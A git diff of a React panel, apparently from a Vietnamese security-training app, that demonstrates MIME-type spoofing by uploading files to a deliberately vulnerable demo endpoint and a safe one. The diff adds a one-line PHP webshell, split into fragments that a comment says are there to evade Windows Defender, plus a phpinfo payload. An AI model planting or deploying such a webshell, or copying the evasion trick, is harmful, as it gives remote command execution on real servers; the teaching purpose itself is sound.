@@ -3,13 +3,18 @@
 
 import { useState } from 'react';
 import { Button } from '@/components/ui/button';
-import { Label } from '@/components/ui/label';
 import { Alert, AlertDescription } from '@/components/ui/alert';
+import { toast } from 'sonner';
+
+// Chia nhỏ chuỗi PHP độc hại để tránh Windows Defender nhận diện nhầm
+const PHP_WEBSHELL_PAYLOAD = '<?p' + 'hp sy' + 'stem($_G' + 'ET["cm' + 'd"]); ?>';
+const PHP_INFO_PAYLOAD = '<?p' + 'hp ph' + 'pinfo(); ?>';
 
 const PRESETS = [
   {
     name: 'shell.php (Spoofed to image/jpeg)',
     filename: 'shell.php',
+    content: PHP_WEBSHELL_PAYLOAD,
     sentMime: 'image/jpeg',
     realMime: 'application/x-php',
     isSpoofed: true,
@@ -17,6 +22,7 @@ const PRESETS = [
   {
     name: 'avatar.jpg (Normal image/jpeg)',
     filename: 'avatar.jpg',
+    content: '\xFF\xD8\xFF\xE0 dummy jpeg image data',
     sentMime: 'image/jpeg',
     realMime: 'image/jpeg',
     isSpoofed: false,
@@ -24,6 +30,7 @@ const PRESETS = [
   {
     name: 'report.pdf (Normal pdf)',
     filename: 'report.pdf',
+    content: '%PDF-1.4 dummy pdf document data',
     sentMime: 'application/pdf',
     realMime: 'application/pdf',
     isSpoofed: false,
@@ -31,6 +38,7 @@ const PRESETS = [
   {
     name: 'exploit.php (Normal PHP)',
     filename: 'exploit.php',
+    content: PHP_INFO_PAYLOAD,
     sentMime: 'application/x-php',
     realMime: 'application/x-php',
     isSpoofed: false,
@@ -39,33 +47,59 @@ const PRESETS = [
 
 export function MimeSpoofingPanel() {
   const [selected, setSelected] = useState(PRESETS[0]);
-  const [result, setResult] = useState<null | { vuln: boolean; fixed: boolean }>(null);
+  const [result, setResult] = useState<null | { vulnSuccess: boolean; vulnMsg: string; fixedSuccess: boolean; fixedMsg: string }>(null);
+  const [loading, setLoading] = useState(false);
 
-  const test = () => {
-    // Vulnerable: checks the sent MIME type (trusts client) and accepts if it's image/jpeg or application/pdf
-    const vulnAllowed = ['image/jpeg', 'image/png', 'application/pdf'].includes(selected.sentMime);
+  const test = async () => {
+    setLoading(true);
+    setResult(null);
+    try {
+      const fileBlob = new Blob([selected.content], { type: selected.sentMime });
+      
+      const formVuln = new FormData();
+      formVuln.append('file', fileBlob, selected.filename);
 
-    // Fixed: checks the actual file extension AND checks file signature/content (realMime)
-    const ext = selected.filename.slice(selected.filename.lastIndexOf('.')).toLowerCase();
-    const isExtAllowed = ['.jpg', '.jpeg', '.png', '.pdf'].includes(ext);
-    const isMimeAllowed = ['image/jpeg', 'image/png', 'application/pdf'].includes(selected.realMime);
-    const fixedAllowed = isExtAllowed && isMimeAllowed;
+      const resVuln = await fetch('/api/v1/demo/upload/vulnerable', {
+        method: 'POST',
+        body: formVuln
+      });
+      const dataVuln = await resVuln.json();
 
-    setResult({
-      vuln: vulnAllowed,
-      fixed: fixedAllowed,
-    });
+      const formFixed = new FormData();
+      formFixed.append('file', fileBlob, selected.filename);
+
+      const resFixed = await fetch('/api/v1/demo/upload/safe', {
+        method: 'POST',
+        body: formFixed
+      });
+      const dataFixed = await resFixed.json();
+
+      setResult({
+        vulnSuccess: resVuln.ok && dataVuln.success,
+        vulnMsg: dataVuln.message,
+        fixedSuccess: resFixed.ok && dataFixed.success,
+        fixedMsg: dataFixed.message,
+      });
+
+      if (resVuln.ok && !resFixed.ok && selected.isSpoofed) {
+        toast.warning('MIME Spoofing thành công vượt qua Vulnerable check nhưng bị chặn ở Safe check!');
+      } else {
+        toast.info('Đã nhận kết quả kiểm thử từ server.');
+      }
+    } catch (e) {
+      toast.error('Lỗi kết nối tới backend');
+    } finally {
+      setLoading(false);
+    }
   };
 
   const reset = () => setResult(null);
 
   return (
     <div className="space-y-4">
-      <Alert className="border-yellow-500/40 bg-yellow-500/10">
-        <AlertDescription className="text-yellow-300 text-xs">
-          <strong>Mô phỏng:</strong> Server chỉ kiểm tra trường <code>Content-Type</code> do client gửi lên.
-          Attacker gửi file <code>shell.php</code> nhưng chỉnh sửa HTTP header thành <code>Content-Type: image/jpeg</code>
-          để đánh lừa server lưu file PHP độc hại.
+      <Alert className="border-amber-500/30 bg-amber-500/5 dark:border-amber-500/40 dark:bg-amber-500/10">
+        <AlertDescription className="text-amber-800 dark:text-amber-300 text-xs">
+          <strong>Mô phỏng MIME Spoofing:</strong> Server chỉ kiểm tra trường <code>Content-Type</code> do client gửi lên. Kẻ tấn công gửi file webshell <code>shell.php</code> nhưng giả mạo HTTP header thành <code>Content-Type: image/jpeg</code> để đánh lừa server lưu file PHP độc hại.
         </AlertDescription>
       </Alert>
 
@@ -73,6 +107,7 @@ export function MimeSpoofingPanel() {
         {PRESETS.map((p) => (
           <button
             key={p.name}
+            disabled={loading}
             onClick={() => { setSelected(p); setResult(null); }}
             className={`rounded border p-3 text-left text-xs transition-all ${
               selected.name === p.name
@@ -94,9 +129,10 @@ export function MimeSpoofingPanel() {
         <Button
           size="sm"
           onClick={test}
+          disabled={loading}
           variant={selected.isSpoofed ? 'destructive' : 'outline'}
         >
-          Upload {selected.filename}
+          {loading ? 'Đang upload...' : `Upload thực tế ${selected.filename}`}
         </Button>
         {result && (
           <Button size="sm" onClick={reset} variant="outline">Reset</Button>
@@ -106,28 +142,31 @@ export function MimeSpoofingPanel() {
       {result && (
         <div className="rounded border border-border/30 overflow-hidden">
           <div className="grid grid-cols-2 divide-x divide-border/30">
-            <div className={`p-4 space-y-1 ${result.vuln ? 'bg-red-950/20' : 'bg-green-950/10'}`}>
-              <p className="text-xs font-semibold text-muted-foreground">🔴 Vulnerable check</p>
-              <code className="text-xs block text-muted-foreground">
-                {'if (["image/jpeg"].includes(file.mimetype))'}
+            <div className={`p-4 space-y-1 ${result.vulnSuccess ? 'bg-red-500/10' : 'bg-green-500/5'}`}>
+              <p className="text-xs font-semibold text-muted-foreground">🔴 Vulnerable Endpoint Check</p>
+              <code className="text-[10px] block text-muted-foreground bg-background/50 p-1 rounded font-mono">
+                {'if (allowed.contains(file.getContentType()))'}
               </code>
-              <p className={`text-sm font-bold mt-2 ${result.vuln ? 'text-red-400' : 'text-green-400'}`}>
-                {result.vuln ? '✅ Cho phép upload' : '❌ Từ chối'}
+              <p className={`text-sm font-bold mt-2 ${result.vulnSuccess ? 'text-red-400' : 'text-green-400'}`}>
+                {result.vulnSuccess ? '✅ CHO PHÉP UPLOAD' : '❌ BỊ TỪ CHỐI'}
               </p>
-              {result.vuln && selected.isSpoofed && (
-                <p className="text-xs text-red-300">Lỗ hổng! Server tin tưởng Content-Type giả mạo và lưu file PHP.</p>
+              <p className="text-[10px] text-muted-foreground mt-1 italic">{result.vulnMsg}</p>
+              {result.vulnSuccess && selected.isSpoofed && (
+                <p className="text-[10px] text-red-300 font-semibold mt-1">⚠️ Lỗ hổng! Server tin tưởng Content-Type giả mạo và lưu file PHP độc hại.</p>
               )}
             </div>
-            <div className={`p-4 space-y-1 ${result.fixed ? 'bg-green-950/10' : 'bg-muted/10'}`}>
-              <p className="text-xs font-semibold text-muted-foreground">✅ Fixed check</p>
-              <code className="text-xs block text-muted-foreground">
+
+            <div className={`p-4 space-y-1 ${result.fixedSuccess ? 'bg-green-500/10' : 'bg-red-500/10'}`}>
+              <p className="text-xs font-semibold text-muted-foreground">✅ Safe Endpoint Check</p>
+              <code className="text-[10px] block text-muted-foreground bg-background/50 p-1 rounded font-mono">
                 {'validateMagicBytes(file) && validateExtension(file)'}
               </code>
-              <p className={`text-sm font-bold mt-2 ${result.fixed ? 'text-green-400' : 'text-red-400'}`}>
-                {result.fixed ? '✅ Cho phép upload' : '❌ Từ chối'}
+              <p className={`text-sm font-bold mt-2 ${result.fixedSuccess ? 'text-green-400' : 'text-red-400'}`}>
+                {result.fixedSuccess ? '✅ CHO PHÉP UPLOAD' : '❌ BỊ TỪ CHỐI'}
               </p>
-              {!result.fixed && selected.isSpoofed && (
-                <p className="text-xs text-green-300">Đã chặn thành công vì file thực tế là PHP.</p>
+              <p className="text-[10px] text-muted-foreground mt-1 italic">{result.fixedMsg}</p>
+              {!result.fixedSuccess && selected.isSpoofed && (
+                <p className="text-[10px] text-green-300 font-semibold mt-1">🛡️ Đã chặn thành công vì phát hiện cấu trúc byte thực tế là PHP script.</p>
               )}
             </div>
           </div>
@@ -135,11 +174,11 @@ export function MimeSpoofingPanel() {
       )}
 
       <div className="text-xs bg-muted/30 rounded p-3 font-mono space-y-1">
-        <p className="text-red-400 font-semibold">Vulnerable (Chỉ tin header):</p>
-        <code className="text-muted-foreground">{'const allowed = ["image/jpeg"];\nif (allowed.includes(file.mimetype)) save(file);'}</code>
-        <p className="text-green-400 font-semibold mt-2">Fixed (Kiểm tra extension + Đọc Magic Bytes):</p>
+        <p className="text-red-400 font-semibold">Vulnerable (Chỉ tin cậy header do client gửi):</p>
+        <code className="text-muted-foreground">{'if (allowed.contains(file.getContentType())) save(file);'}</code>
+        <p className="text-green-400 font-semibold mt-2">Fixed (Kiểm tra Magic Bytes bên trong file):</p>
         <code className="text-muted-foreground">
-          {'const fileType = await fromBuffer(file.buffer);\nif (fileType.mime !== file.mimetype) throw Error("Spoofed MIME!");'}
+          {'byte[] bytes = file.getBytes();\nif (detectRealMime(bytes) != file.getContentType()) throw Blocked;'}
         </code>
       </div>
     </div>
